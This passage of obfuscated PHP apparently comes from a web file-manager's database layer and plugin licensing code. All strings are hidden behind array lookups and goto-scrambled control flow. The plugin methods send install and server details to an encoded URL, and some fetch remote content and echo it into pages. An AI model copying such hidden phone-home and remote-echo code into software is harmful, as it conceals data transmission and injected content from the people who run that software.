0); } return $b՘ڶ; } public function getFields($F) { $dŽ =& $_SERVER[拘]; $b똎 = $this->{$_SERVER[拘][260]}($dŽ[1307] . $F . $dŽ[1308]); $dȌ = array(); if ($b똎) { foreach ($b똎 as $fǐ => $f盾˴) { $dȌ[$f盾˴[$dŽ[1282]]] = array($dŽ[375] => $f盾˴[$dŽ[1282]], $dŽ[400] => $f盾˴[$dŽ[1283]], $dŽ[1229] => (bool) ($f盾˴[$dŽ[1284]] === $dŽ[67]), $dŽ[897] => $f盾˴[$dŽ[1286]], $dŽ[997] => $dŽ[80]($f盾˴[$dŽ[1287]]) == $dŽ[1231], $dŽ[999] => $dŽ[80]($f盾˴[$dŽ[1288]]) == $dŽ[1234]); } } return $dȌ; } public function getTables($f︮ = '') { $A =& $_SERVER[拘]; $F = $this->{$_SERVER[拘][260]}($A[1242] . $A[1243] . $A[1244]); $CՇ̙ = array(); foreach ($F as $A => $d) { $CՇ̙[$A] = $A[1247]($d); } return $CՇ̙; } public function close() { $a =& $_SERVER[拘]; if ($this->_linkID) { $a[1320]($this->_linkID); } $this->_linkID = null; CacheLock::unlock($a[1297]); } public function error() { $F =& $_SERVER[拘]; $eꆎە = $F[1321]($this->_linkID); $this->error = $eꆎە . $F[91] . $F[1312]($eꆎە); if ($F[67] != $this->queryStr) { $this->error .= $F[387]($F[1251]) . $this->queryStr; } $F[137]($this->error, $F[67], $F[1252]); return $this->error; } public function escapeString($e) { return $_SERVER[拘][1322]($e); } public function parseLimit($Fԭ) { $F =& $_SERVER[拘]; $c奅 = $F[67]; if (!empty($Fԭ)) { $Fԭ = $F[4]($F[119], $Fԭ); if ($F[37]($Fԭ) > 1) { $c奅 .= $F[212] . $Fԭ[1] . $F[1248] . $Fԭ[0] . $F[168]; } else { $c奅 .= $F[212] . $Fԭ[0] . $F[168]; } } return $c奅; } } class DbMysqli extends Db { public function __construct($Eɱ = '') { $A =& $_SERVER[拘]; if (!$A[1258]($A[1323])) { $A[76]($A[77]($A[1178]) . $A[1324]); } if (!empty($Eɱ)) { $this->config = $Eɱ; if (empty($this->config[$A[106]])) { $this->config[$A[106]] = $A[67]; } } } public function connect($EӪ = '', $a̟ = 0) { $cĝͩ =& $_SERVER[拘]; if (!isset($this->linkID[$a̟])) { goto e; Bґ: $this->connected = !0; if (1 != $cĝͩ[108]($cĝͩ[116])) { unset($this->config); } goto e; fǈ: $Eӎ˘ = $this->linkID[$a̟]->server_version; $this->linkID[$a̟]->{$_SERVER[拘][260]}($cĝͩ[1268] . $cĝͩ[108]($cĝͩ[1191]) . $cĝͩ[1206]); if ($Eӎ˘ > $cĝͩ[1269]) { $this->linkID[$a̟]->{$_SERVER[拘][260]}($cĝͩ[1270]); } goto Bґ; e: if (empty($EӪ)) { $EӪ = $this->config; } $this->linkID[$a̟] = new mysqli($EӪ[$cĝͩ[100]], $EӪ[$cĝͩ[96]], $EӪ[$cĝͩ[98]], $EӪ[$cĝͩ[14]], $EӪ[$cĝͩ[102]] ? $cĝͩ[455]($EӪ[$cĝͩ[102]]) : 3306); if ($cĝͩ[1326]()) { $cĝͩ[76]($cĝͩ[1327]()); } goto fǈ; e: } return $this->linkID[$a̟]; } public function free() { $this->queryID->{$_SERVER[拘][1328]}(); $this->queryID = null; } public function query($e˶) { goto F; eŐ: $this->queryStr = $e˶; if ($this->queryID) { $this->{$_SERVER[拘][290]}(); } $C[1196]($C[1197], 1); goto fᰃ; F: $C =& $_SERVER[拘]; $this->{$_SERVER[拘][1192]}(!1); if (!$this->_linkID) { return !1; } goto eŐ; fᰃ: $C[135]($C[139]); $this->queryID = $this->_linkID->{$_SERVER[拘][260]}($e˶); if ($this->_linkID->{$_SERVER[拘][1329]}()) { while (($ḟ = $this->_linkID->{$_SERVER[拘][1330]}()) != NULL) { $ḟ->{$_SERVER[拘][1328]}(); } } goto Eϗ; Eϗ: $this->{$_SERVER[拘][1200]}(); if (!1 === $this->queryID) { $this->{$_SERVER[拘][1199]}(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->{$_SERVER[拘][1201]}(); } goto BҐ; BҐ: } public function execute($A󐥸) { goto b׏; fǨҍ: $aћ[135]($aћ[139]); $e迃 = $this->_linkID->{$_SERVER[拘][260]}($A󐥸); $this->{$_SERVER[拘][1200]}(); goto E; E: if (!1 === $e迃) { $this->{$_SERVER[拘][1199]}(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto dц; d: $this->queryStr = $A󐥸; if ($this->queryID) { $this->{$_SERVER[拘][290]}(); } $aћ[1196]($aћ[1207], 1); goto fǨҍ; b׏: $aћ =& $_SERVER[拘]; $this->{$_SERVER[拘][1192]}(!0); if (!$this->_linkID) { return !1; } goto d; dц: } public function startTrans() { $this->{$_SERVER[拘][1192]}(!0); if ($this->transTimes == 0) { $this->_linkID->{$_SERVER[拘][1331]}(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $d漂 = $this->_linkID->{$_SERVER[拘][1034]}(); $this->_linkID->{$_SERVER[拘][1331]}(!0); $this->transTimes = 0; if (!$d漂) { $this->{$_SERVER[拘][1199]}(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Eި = $this->_linkID->{$_SERVER[拘][1129]}(); $this->transTimes = 0; if (!$Eި) { $this->{$_SERVER[拘][1199]}(); return !1; } } return !0; } private function getAll() { $F = array(); if ($this->numRows > 0) { for ($eɲ = 0; $eɲ < $this->numRows; $eɲ++) { $F[$eɲ] = $this->queryID->{$_SERVER[拘][1332]}(); } $this->queryID->{$_SERVER[拘][1333]}(0); } return $F; } public function getFields($c) { $Bȴы =& $_SERVER[拘]; $fǡ = $this->{$_SERVER[拘][260]}($Bȴы[1281] . $this->{$_SERVER[拘][146]}($c)); $Bˎ = array(); if ($fǡ) { foreach ($fǡ as $Cφ => $Eֶ) { $Bˎ[$Eֶ[$Bȴы[1282]]] = array($Bȴы[375] => $Eֶ[$Bȴы[1282]], $Bȴы[400] => $Eֶ[$Bȴы[1283]], $Bȴы[1229] => (bool) ($Eֶ[$Bȴы[1284]] === $Bȴы[67]), $Bȴы[897] => $Eֶ[$Bȴы[1286]], $Bȴы[997] => $Bȴы[80]($Eֶ[$Bȴы[1287]]) == $Bȴы[1231], $Bȴы[999] => $Bȴы[80]($Eֶ[$Bȴы[1288]]) == $Bȴы[1234]); } } return $Bˎ; } public function getTables($bƂ = '') { $Aؘ =& $_SERVER[拘]; $b̲ = !empty($bƂ) ? $Aؘ[1245] . $bƂ : $Aؘ[1246]; $D = $this->{$_SERVER[拘][260]}($b̲); $Aܨ = array(); if ($D) { foreach ($D as $f􅜴 => $D) { $Aܨ[$f􅜴] = $Aؘ[1247]($D); } } return $Aܨ; } public function replace($d݌, $bř = array()) { $bר뉊 =& $_SERVER[拘]; foreach ($d݌ as $dܵ => $a) { $E֍ = $this->{$_SERVER[拘][150]}($a); if ($bר뉊[148]($E֍)) { $Eƨ[] = $E֍; $C[] = $this->{$_SERVER[拘][146]}($dܵ); } } $Bᙎ = $bר뉊[1289] . $this->{$_SERVER[拘][238]}($bř[$bר뉊[239]]) . $bר뉊[204] . $bר뉊[152]($bר뉊[119], $C) . $bר뉊[240] . $bר뉊[152]($bר뉊[119], $Eƨ) . $bר뉊[191]; return $this->{$_SERVER[拘][245]}($Bᙎ); } public function insertAll($B֑䏤, $F = array(), $b֘Ӆ = false) { goto B¸; C: $aό = array(); foreach ($B֑䏤 as $aƊ) { $b⦅ = array(); foreach ($aƊ as $d΃ => $C) { $C = $this->{$_SERVER[拘][150]}($C); if ($D[148]($C)) { $b⦅[] = $C; } } $aό[] = $D[189] . $D[152]($D[119], $b⦅) . $D[191]; } $D[170]($EǏ, array($this, $D[171])); goto CԵ; CԵ: $d = ($b֘Ӆ ? $D[235] : $D[236]) . $D[237] . $this->{$_SERVER[拘][238]}($F[$D[239]]) . $D[204] . $D[152]($D[119], $EǏ) . $D[1290] . $D[152]($D[119], $aό); return $this->{$_SERVER[拘][245]}($d); goto f٤; B¸: $D =& $_SERVER[拘]; if (!$D[93]($B֑䏤[0])) { return !1; } $EǏ = $D[766]($B֑䏤[0]); goto C; f٤: } public function close() { if ($this->_linkID) { $this->_linkID->{$_SERVER[拘][291]}(); } $this->_linkID = null; } public function error() { $Bʏޓ =& $_SERVER[拘]; $this->error = $this->_linkID->errno . $Bʏޓ[91] . $this->_linkID->error; if ($Bʏޓ[67] != $this->queryStr) { $this->error .= $Bʏޓ[387]($Bʏޓ[1251]) . $this->queryStr; } $Bʏޓ[137]($this->error, $Bʏޓ[67], $Bʏޓ[1252]); return $this->error; } public function escapeString($c맯̳) { if ($this->_linkID) { return $this->_linkID->{$_SERVER[拘][1334]}($c맯̳); } else { return $_SERVER[拘][289]($c맯̳); } } public function parseKey(&$C؂, $AחԼ = true) { $AƯͲ =& $_SERVER[拘]; if ($AחԼ) { $C؂ = $this->{$_SERVER[拘][154]}($C؂); } if ($C؂ != $AƯͲ[167] && !$AƯͲ[131]($AƯͲ[1249], $C؂)) { $C؂ = $AƯͲ[174] . $AƯͲ[70]($C؂, $AƯͲ[174]) . $AƯͲ[174]; } return $C؂; } } goto B; Eƭԓ: $_SERVER[拘][0]($_SERVER[拘][1480], $_SERVER[拘][1481]); $_SERVER[$_SERVER[拘][1482]] = $_SERVER[拘][4]($_SERVER[拘][1483], $_SERVER[拘][6]($_SERVER[拘][7]($_SERVER[拘][1484], 10, -8))); class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\x6d\56\160\154\165\x67\x69\x6e\x4c\x69\x73\x74"; public $field = array("\156\141\x6d\145", "\163\x74\x61\164\x75\163", "\x72\145\x67\x69\145\x73\x74", "\x63\157\156\x66\x69\147"); private $versionData = array(); private $version = "\101"; public function loadList($C = false) { $CԷ =& $_SERVER[拘]; $d =& $_SERVER[$CԷ[1482]]; $A = $d[0]($this->{$_SERVER[$CԷ[1482]][1]}(), $d[2]); if ($C) { return $A[$C]; } return $A; } public function init() { goto F̙; f۝: foreach ($C¢܆ as $Bۧ => $cԚ) { $aԖȠ = $this->{$_SERVER[$DɊ[1482]][7]}($Bۧ, $cԚ); if (!$aԖȠ) { continue; } foreach ($cԚ[$B̟[8]] as $f => $C) { Hook::bind($f, $C); } } Hook::trigger($B̟[11]); Hook::trigger(ACTION); goto f; f: $BߪĬ = array($B̟[12], $B̟[13]); if (isset($_GET[$B̟[14]]) && $B̟[15]($B̟[16](ACTION), $BߪĬ)) { $b = $B̟[17]($_GET[$B̟[14]]); $B̟[18]($B̟[19]); if ($GLOBALS[$B̟[20]] && $b && $B̟[21]($b, 0, 4) == $B̟[22]) { $b = $B̟[23]($B̟[24], $B̟[25], $b); $F = $B̟[26]($b, $B̟[27], !1, !1, !1, !1, 2); if ($F[$B̟[28]] && $B̟[29]($F[$B̟[28]], $B̟[30])) { echo $F[$B̟[28]]; } } die; } $this->{$_SERVER[$DɊ[1482]][31]}(); goto cۦӮ; F´: $this->{$_SERVER[$DɊ[1482]][4]}(); $this->{$_SERVER[$DɊ[1482]][5]}(); $C¢܆ = $this->{$_SERVER[$DɊ[1482]][6]}($C¢܆); goto f۝; cۦӮ: $this->{$_SERVER[$DɊ[1482]][32]}(); $this->{$_SERVER[$DɊ[1482]][33]}(); Hook::bind($B̟[34], $B̟[35]); goto e; F̙: $DɊ =& $_SERVER[拘]; $B̟ =& $_SERVER[$DɊ[1482]]; $C¢܆ = $this->{$_SERVER[$DɊ[1482]][3]}(); goto F´; e: Hook::bind($B̟[36], $B̟[37]); goto dÆʕ; dÆʕ: } public function optionsFilter($Eȅ) { goto f˚; E: $Eȅ[$Cӂ[64]][$Cӂ[65]][$Cӂ[69]] = array($Cӂ[70] => (int) $fÜ[$Cӂ[71]], $Cӂ[72] => $Cӂ[73]($fÜ, $Cӂ[74], array()), $Cӂ[75] => (int) $Cӂ[73]($fÜ, $Cӂ[76], 0)); $Eȅ[$Cӂ[77]][$Cӂ[78]] = $Cӂ[79]($Cӂ[80])->{$_SERVER[$fԘ[1482]][81]}(); $Eȅ[$Cӂ[77]][$Cӂ[82]] = $Cӂ[83](BASIC_PATH . $B㬅[$Cӂ[84]]); goto c; dΏ: if ($this->version == $Cӂ[89]) { $Eȅ[$Cӂ[64]][$Cӂ[65]][$Cӂ[69]][$Cӂ[76]] = 0; } $Eȅ[$Cӂ[77]][$Cӂ[96]] = $Cӂ[73]($this->versionData, $Cӂ[97], $Cӂ[98]); if ($GLOBALS[$Cӂ[20]] && $this->config[$Cӂ[99]]) { $Eȅ[$Cӂ[77]][$Cӂ[100]] = WEB_ROOT; } goto C; C: return $Eȅ; goto C׏; c: $Eȅ[$Cӂ[77]][$Cӂ[85]] = $Cӂ[86]($Cӂ[87]()); $Eȅ[$Cӂ[77]][$Cӂ[88]] = $this->version; if ($B㬅[$Cӂ[88]] != $Cӂ[89]) { $Eȅ[$Cӂ[77]][$Cӂ[90]] = $B㬅[$Cӂ[90]]; $Eȅ[$Cӂ[77]][$Cӂ[91]] = $B㬅[$Cӂ[91]]; $f = $Cӂ[92](10) . $this->version . $Cӂ[92](5); $Eȅ[$Cӂ[64]][$Cӂ[93]][$Cӂ[94]] = $this->{$_SERVER[$fԘ[1482]][95]}($f, $Eȅ[$Cӂ[77]][$Cӂ[82]]); } goto dΏ; f: $Dʚ۽ = array($Cӂ[41], $Cӂ[42], $Cӂ[43], $Cӂ[44], $Cӂ[45], $Cӂ[46], $Cӂ[47], $Cӂ[48], $Cӂ[49], $Cӂ[50], $Cӂ[51], $Cӂ[52], $Cӂ[53], $Cӂ[54], $Cӂ[55], $Cӂ[56], $Cӂ[57], $Cӂ[58], $Cӂ[59], $Cӂ[60], $Cӂ[61]); foreach ($Dʚ۽ as $Bؖ) { $c = $GLOBALS[$Cӂ[62]][$Cӂ[63]][$Bؖ]; if (isset($B㬅[$Bؖ])) { $c = $B㬅[$Bؖ]; } $Eȅ[$Cӂ[64]][$Cӂ[65]][$Bؖ] = $c; } $fÜ = $Eȅ[$Cӂ[64]][$Cӂ[65]][$Cӂ[52]]; goto e; e: unset($Eȅ[$Cӂ[64]][$Cӂ[66]][$Cӂ[67]]); unset($Eȅ[$Cӂ[64]][$Cӂ[65]][$Cӂ[52]]); unset($Eȅ[$Cӂ[64]][$Cӂ[65]][$Cӂ[68]]); goto E; f˚: $fԘ =& $_SERVER[拘]; $Cӂ =& $_SERVER[$fԘ[1482]]; $B㬅 = $Cӂ[38]($Cӂ[39])->{$_SERVER[$fԘ[1482]][40]}(); goto f; C׏: } private function assignCopyright() { goto B; B: $B㳷 =& $_SERVER[拘]; $AΪ =& $_SERVER[$B㳷[1482]]; if ($this->version == $AΪ[89]) { return; } goto A͠; C֮: if (ACTION == $AΪ[12]) { $cӷڇ = $this->{$_SERVER[$B㳷[1482]][110]}(); $e񚻩茞 = $AΪ[111] . $cӷڇ . $AΪ[112]; if ($cӷڇ >= 10000) { $e񚻩茞 = $AΪ[113]; } $B氰[$AΪ[114]] = $e񚻩茞; } foreach ($Eߨ as $Aռ) { if (!isset($E۴[$Aռ]) || !$E۴[$Aռ]) { continue; } $B氰[$Aռ] = $E۴[$Aռ]; } I18n::set($B氰); goto c맚; A͠: $Eߨ = array($AΪ[101], $AΪ[102], $AΪ[103], $AΪ[104], $AΪ[105], $AΪ[106]); $E۴ = $AΪ[38]($AΪ[39])->{$_SERVER[$B㳷[1482]][40]}(); $B氰 = array($AΪ[107] => $E۴[$AΪ[41]], $AΪ[108] => $E۴[$AΪ[42]], $AΪ[109] => $AΪ[98]); goto C֮; c맚: } private function checkDataInit() { goto f쏳; cЌ: $Aٲ = $AҶī[92](16); $DӋ = $Aٲ . $Aڅ[$AҶī[88]] . Mcrypt::encode($AҶī[83]($Aڅ[$AҶī[149]]), $Aٲ); $Aڅ[$AҶī[91]] = $AҶī[86]($AҶī[154](Mcrypt::encode($DӋ, $AҶī[156]))); goto EƂ; Aʪ: $Aѽ͹ = $AҶī[38]($AҶī[39])->{$_SERVER[$Aੇ[1482]][40]}($AҶī[84]); $Fퟔ = Mcrypt::decode($AҶī[125], $AҶī[77]); $fƸ = array($AҶī[120] => $CЧ[$AҶī[120]], $AҶī[126] => $_SERVER[$AҶī[127]], $AҶī[128] => INSTALL_CHANNEL, $AҶī[129] => $AҶī[92](16)); goto cɕ; E╢Ǽ: $eل = $AҶī[21]($AҶī[83]($Aڅ[$AҶī[150]]), 10, 10); $dǇ = $eل . $Aڅ[$AҶī[88]] . $Aڅ[$AҶī[152]]; $Aڅ[$AҶī[90]] = $AҶī[154]($AҶī[86](Mcrypt::encode($dǇ, $AҶī[155]))); goto cЌ; A历: $A = $AҶī[154]($AҶī[21]($bԖܐ, 10, 16)); $A۱ = $this->{$_SERVER[$Aੇ[1482]][95]}($AҶī[133]($F), $bԖܐ); $C܍ = $this->{$_SERVER[$Aੇ[1482]][3]}(); goto A޵ʗ; cޟ: $CЧ = $GLOBALS[$AҶī[117]]; if (isset($CЧ[$AҶī[118]])) { $this->{$_SERVER[$Aੇ[1482]][119]}(); die; } if (!isset($CЧ[$AҶī[120]]) || $AҶī[121]($CЧ[$AҶī[120]]) != 16) { $AҶī[122]($AҶī[123] . $CЧ[$AҶī[120]], !1); } goto Aʪ; EƂ: if ($F[$AҶī[157]] && $F[$AҶī[157]] >= 1) { $AҶī[38]($AҶī[39])->{$_SERVER[$Aੇ[1482]][158]}($AҶī[159], $AҶī[160]); } $AҶī[38]($AҶī[39])->{$_SERVER[$Aੇ[1482]][115]}($Aڅ); $bԖܐ = $AҶī[83](BASIC_PATH . $AҶī[154]($Aѽ͹) . $Aڅ[$AҶī[150]]); goto A历; A޵ʗ: $EՐ = $C܍[$AҶī[161]]; $e䐫˨ = $EՐ[$AҶī[62]]; $e䐫˨ = array(); goto cݠ; aϲ: $F = $aȜ[$AҶī[28]]; $Aڅ = array($AҶī[149] => $fƸ[$AҶī[120]], $AҶī[150] => $F[$AҶī[151]], $AҶī[152] => $AҶī[92](16), $AҶī[88] => $F[$AҶī[153]]); if ($fƸ[$AҶī[129]]) { $Aڅ[$AҶī[152]] = $fƸ[$AҶī[129]]; } goto E╢Ǽ; f쏳: $Aੇ =& $_SERVER[拘]; $AҶī =& $_SERVER[$Aੇ[1482]]; if (ACTION != $AҶī[116] || !$GLOBALS[$AҶī[20]]) { return; } goto cޟ; cݠ: $e䐫˨[$A] = $A۱; $this->{$_SERVER[$Aੇ[1482]][162]}($EՐ[$AҶī[163]], array($AҶī[164] => $e䐫˨)); $AҶī[122]($AҶī[147]($AҶī[165]), !0); goto b㟺; cɕ: $F՚ = $AҶī[83](BASIC_PATH . $Aѽ͹); if ($CЧ[$AҶī[130]] == $AҶī[131]) { $Bթ = Mcrypt::encode($F՚, $AҶī[132]); $dₔ = $AҶī[133]($fƸ); $dₔ = $this->{$_SERVER[$Aੇ[1482]][95]}($dₔ, $F՚ . $AҶī[134], 3); $e = $Fퟔ . $AҶī[135] . $Bթ . $AҶī[136]; $AҶī[122]($e . $dₔ, !0, $Fퟔ); } else { if ($CЧ[$AҶī[130]] == $AҶī[137]) { $BƧ = $AҶī[21]($AҶī[83]($AҶī[138], $F՚), 12, 15) . $AҶī[139]; $dₔ = $this->{$_SERVER[$Aੇ[1482]][124]}($CЧ[$AҶī[140]], $BƧ, 2); $aȜ = $AҶī[141]($dₔ, !0); if (!$AҶī[142]($aȜ) || !$AҶī[142]($aȜ[$AҶī[28]]) || $aȜ[$AҶī[120]] != !0) { $c = $AҶī[143]; $C = $aȜ[$AҶī[28]] ? $AҶī[144] . $aȜ[$AҶī[28]] : $c; $AҶī[145]($aȜ); die; $AҶī[122]($C, !1); } else { $fƸ[$AҶī[129]] = $aȜ[$AҶī[28]][$AҶī[146]]; } } else { $aȜ = $AҶī[26]($Fퟔ, $AҶī[27], $fƸ, !1, !1, !0, 10); $aȜ = $aȜ[$AҶī[28]]; } } if (!$AҶī[142]($aȜ) || !$AҶī[142]($aȜ[$AҶī[28]]) || $aȜ[$AҶī[120]] != !0) { $c = $AҶī[147]($AҶī[148]); $C = $aȜ[$AҶī[28]] ? $AҶī[144] . $aȜ[$AҶī[28]] : $c; $AҶī[122]($C, !1); } goto aϲ; b㟺: } private function dataReset() { $DΌ =& $_SERVER[拘]; $c֒ =& $_SERVER[$DΌ[1482]]; $c֒[38]($c֒[39])->{$_SERVER[$DΌ[1482]][115]}(array($c֒[149] => $c֒[98], $c֒[150] => $c֒[98], $c֒[88] => $c֒[89], $c֒[90] => $c֒[98], $c֒[91] => $c֒[98])); $c֒[38]($c֒[39])->{$_SERVER[$DΌ[1482]][158]}($c֒[159], $c֒[166]); $this->versionData = array(); $this->version = $c֒[89]; } private function dataCheck() { goto C; cܞ: if ($a[$fɅ[88]] == $fɅ[89]) { $this->{$_SERVER[$BǙƉ[1482]][5]}(); return; } $F = $fɅ[38]($fɅ[39])->{$_SERVER[$BǙƉ[1482]][40]}($fɅ[84]); $aŗ = $fɅ[0]($this->{$_SERVER[$BǙƉ[1482]][1]}(), $fɅ[2]); goto dۏ; c訐Ŋ: $cŴК = $fɅ[167]($C[$fɅ[168]]); if ($fɅ[169]() >= $cŴК) { return $this->{$_SERVER[$BǙƉ[1482]][119]}(); } $this->versionData = $C; goto cՑ; dۏ: $dȉ = $aŗ[$fɅ[161]]; $A惬 = $fɅ[83](BASIC_PATH . $fɅ[154]($F) . $a[$fɅ[150]]); $bɌ = $fɅ[154]($fɅ[21]($A惬, 10, 16)); goto A; C: $BǙƉ =& $_SERVER[拘]; $fɅ =& $_SERVER[$BǙƉ[1482]]; $a = $fɅ[38]($fɅ[39])->{$_SERVER[$BǙƉ[1482]][40]}(); goto cܞ; A: $C = $this->{$_SERVER[$BǙƉ[1482]][124]}($dȉ[$fɅ[62]][$bɌ], $A惬); $C = $fɅ[141]($C, !0); if (!$fɅ[142]($C)) { return $this->{$_SERVER[$BǙƉ[1482]][119]}(); } goto c訐Ŋ; cՑ: $this->version = $a[$fɅ[88]]; goto f; f: } private function dataAllow() { goto C≢; fÉü: $Bګ = $this->version; if (ACTION == $c̵[170] && $Bګ == $c̵[89]) { $c̵[122]($c̵[147]($c̵[171]), !1, $c̵[172]); } $d = array($c̵[173], $c̵[174]); goto D; D: if ($c̵[15](ACTION, $d)) { if ($Bګ == $c̵[89] && isset($A[$c̵[175]])) { $c̵[122]($c̵[147]($c̵[171]), !1, $c̵[172]); die; } $Fҷ = $this->{$_SERVER[$B˃ߩ[1482]][110]}(); if ($Fҷ != 10000) { if ($Fҷ <= $c̵[38]($c̵[176])->{$_SERVER[$B˃ߩ[1482]][177]}()) { $c̵[122]($c̵[147]($c̵[178]), !1, $c̵[172]); die; } } } Hook::bind($c̵[179], $c̵[180]); goto E; C≢: $B˃ߩ =& $_SERVER[拘]; $c̵ =& $_SERVER[$B˃ߩ[1482]]; $A = $GLOBALS[$c̵[117]]; goto fÉü; E: } private function checkPlugin($D) { goto Eˇ; Eˇ: $e =& $_SERVER[$_SERVER[拘][1482]]; if ($this->version == $e[181]) { return $D; } $aɓϞ = array($e[182], $e[183], $e[184], $e[185], $e[186], $e[187], $e[188], $e[189]); goto fó쌬; fƥ: foreach ($a as $Eȫ) { unset($D[$Eȫ]); } return $D; goto E; fó쌬: $B = $e[190]($e[191], $e[73]($this->versionData, $e[97], $e[98])); $a = array(); foreach ($aɓϞ as $Eȫ) { if (!$e[15]($Eȫ, $B)) { $a[] = $Eȫ; } } goto fƥ; E: } private function checkVersion() { goto c߷ʏ; A𷂢: if ($EҢ[192]($EҢ[193]($EҢ[194], $EҢ[169]())) % 3 != 0) { return; } if (ACTION != $EҢ[195]) { return; } $f᪂ = $EҢ[38]($EҢ[39])->{$_SERVER[$Aꢖ[1482]][40]}($EҢ[149]); goto d; c߷ʏ: $Aꢖ =& $_SERVER[拘]; $EҢ =& $_SERVER[$Aꢖ[1482]]; if ($this->version == $EҢ[89] || !$GLOBALS[$EҢ[20]]) { return; } goto A𷂢; d: $Dݓȑ = $EҢ[83]($f᪂); $D = Cache::get($Dݓȑ); $aǞ΢ = 3600 * 24 * 3; goto A; A: if (!$D || $EҢ[169]() - $D[$EҢ[196]] > $aǞ΢) { goto cœ; Fު̐: if ($a[$EҢ[120]] != !0) { $this->{$_SERVER[$Aꢖ[1482]][119]}(); Cache::remove($Dݓȑ); return; } goto Dӏ; a䳱: $e = $EҢ[26]($fׯĵڴ, $EҢ[27], $aỸ, !1, !1, !0, 5); $a = $e[$EҢ[28]]; if (!$EҢ[142]($a)) { return; } goto Fު̐; cœ: $D = array($EҢ[197] => !0, $EҢ[198] => $EҢ[169]()); $fׯĵڴ = Mcrypt::decode($EҢ[199], $EҢ[77]); $aỸ = array($EҢ[120] => $f᪂, $EҢ[130] => $this->version, $EҢ[128] => INSTALL_CHANNEL); goto a䳱; Dӏ: } Cache::set($Dݓȑ, $D, $aǞ΢); goto Dһ; Dһ: } private function userCount() { goto e֍; Eؖ: $A = $A ? $A : 10; $a˘ = $this->userData[$bʪ[217]]; $a˘ = $a˘ ? $bʪ[192]($a˘) : 0; goto E; e֍: $bʪ =& $_SERVER[$_SERVER[拘][1482]]; $F = array($bʪ[201] => 10, $bʪ[202] => 30, $bʪ[203] => 50, $bʪ[204] => 150, $bʪ[205] => 50, $bʪ[206] => 10000, $bʪ[207] => 10000, $bʪ[208] => 30, $bʪ[209] => 50, $bʪ[210] => 100, $bʪ[211] => 150, $bʪ[212] => 250, $bʪ[213] => 500, $bʪ[214] => 1001, $bʪ[215] => 1500, $bʪ[216] => 2000); $A = $F[$this->version]; goto Eؖ; E: return $A + $a˘; goto c; c: } public function loginCheck($D) { goto f㸏; Aȵǅ: if ($Cľ >= 10000) { return; } $D = $Eӧ銢[38]($Eӧ銢[176])->{$_SERVER[$a[1482]][177]}(); if ($D <= $Cľ) { return; } goto C; C: $d粑 = $Eӧ銢[38]($Eӧ銢[176])->{$_SERVER[$a[1482]][218]}($Eӧ銢[219])->{$_SERVER[$a[1482]][220]}($Cľ)->{$_SERVER[$a[1482]][221]}(); $d粑 = $Eӧ銢[0]($d粑, $Eӧ銢[98], $Eӧ銢[219]); if (!$Eӧ銢[15]($D[$Eӧ銢[219]], $d粑)) { $Eӧ銢[122]($Eӧ銢[222], !1, $Eӧ銢[172]); } goto B˥; f㸏: $a =& $_SERVER[拘]; $Eӧ銢 =& $_SERVER[$a[1482]]; $Cľ = $this->{$_SERVER[$a[1482]][110]}(); goto Aȵǅ; B˥: } public function checkEcho() { $D =& $_SERVER[$_SERVER[拘][1482]]; if ($D[193]($D[223]) % 10 == 1 && $GLOBALS[$D[20]] && $D[224](1, 100) % 10 <= 3) { $Eצ = $D[225]; $A = $D[26]($Eצ, $D[27], !1, !1, !1, !1, 3); echo $D[226] . $D[227]($A[$D[28]]) . $D[228]; } } private function encode($EЯ, $Dʩ, $f = 3) { goto cĜ; dµ͠: if ($f - 1 > 0) { $dǴ = $this->{$_SERVER[$c֑[1482]][95]}($dǴ, $Dʩ, $f - 1); } return $dǴ; goto aˈ; b̰: $E賄 = $d[231]; switch ($C) { case $d[166]: $dǴ = Mcrypt::encode($EЯ, $d[154]($Dʩ . $BŌ)); break; case $d[160]: $dǴ = Mcrypt::encode($EЯ, $d[154]($BŌ . $Dʩ)); break; case $d[232]: $dǴ = Mcrypt::encode($EЯ, $d[86]($BŌ . $Dʩ)); break; case $d[233]: $dǴ = Mcrypt::encode($EЯ, $d[83]($BŌ . $Dʩ)); break; case $d[234]: goto Bߡ; D: $a = $d[83]($c׉ . $d[83]($Dʩ . $c׉) . $Dʩ); $a = $d[21]($a, $Dߑ % 8, $Dߑ % 8 + 7); $f㦃 = $d[98]; goto CĞ; Bߡ: $EЯ = $d[86]($EЯ); $Dߑ = $d[235](0, 64); $c׉ = $E賄[$Dߑ]; goto D; bЖ: for ($D = 0; $D < $d[121]($EЯ); $D++) { $e = $e == $d[121]($a) ? 0 : $e; $F = ($Dߑ + $d[236]($E賄, $EЯ[$D]) + $d[237]($a[$e++])) % 64; $f㦃 .= $E賄[$F]; } $dǴ = $d[227]($c׉ . $f㦃); break; goto D喪; CĞ: $D = 0; $F = 0; $e = 0; goto bЖ; D喪: default: $dǴ = Mcrypt::encode($EЯ, $Dʩ . $BŌ); break; } $dǴ = $d[154]($C . $BŌ . $dǴ); goto dµ͠; cĜ: $c֑ =& $_SERVER[拘]; $d =& $_SERVER[$c֑[1482]]; $d[229](2); goto a; a: $EЯ = $d[230]($EЯ); $C = $d[224](0, 5) . $d[98]; $BŌ = $d[92](15); goto b̰; aˈ: } public function decode($aٚ, $a, $aӿ = 3) { goto E; E: $f =& $_SERVER[拘]; $Fѥ =& $_SERVER[$f[1482]]; if (!$Fѥ[238]($aٚ) || $Fѥ[121]($aٚ) < 10) { return !1; } goto BĪ₌; f䰍: switch ($a) { case $Fѥ[166]: $F = Mcrypt::decode($aٚ, $Fѥ[154]($a . $f÷)); break; case $Fѥ[160]: $F = Mcrypt::decode($aٚ, $Fѥ[154]($f÷ . $a)); break; case $Fѥ[232]: $F = Mcrypt::decode($aٚ, $Fѥ[86]($f÷ . $a)); break; case $Fѥ[233]: $F = Mcrypt::decode($aٚ, $Fѥ[83]($f÷ . $a)); break; case $Fѥ[234]: goto b´; AԦ: $B܋ = $Fѥ[98]; $c = 0; $aᗩ = 0; goto B喇; a: break; goto F; B喇: $d瞠銺 = 0; for ($c = 0; $c < $Fѥ[121]($aٚ); $c++) { $d瞠銺 = $d瞠銺 == $Fѥ[121]($dů) ? 0 : $d瞠銺; $aΌ珦 = $d瞠銺++; $aᗩ = $Fѥ[236]($B著, $aٚ[$c]) - $fسŃ - 